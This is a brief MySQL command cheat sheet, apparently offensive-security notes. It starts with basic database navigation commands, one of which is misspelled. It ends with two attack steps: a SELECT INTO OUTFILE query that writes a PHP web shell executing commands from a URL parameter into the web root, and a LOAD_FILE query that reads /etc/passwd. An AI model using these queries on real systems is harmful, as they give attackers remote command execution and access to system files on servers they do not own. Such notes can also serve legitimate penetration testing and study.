
View Databases:

```bash
show databases;
```

Use Database:

```bash
use <database>;
```

View Tables:


```bash
show tables;
```

View Contents of Table:

```bash
seclect * from <table_name>;
```

Write file to system

```bash
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Read file on system

```bash
select LOAD_FILE("/etc/passwd");
```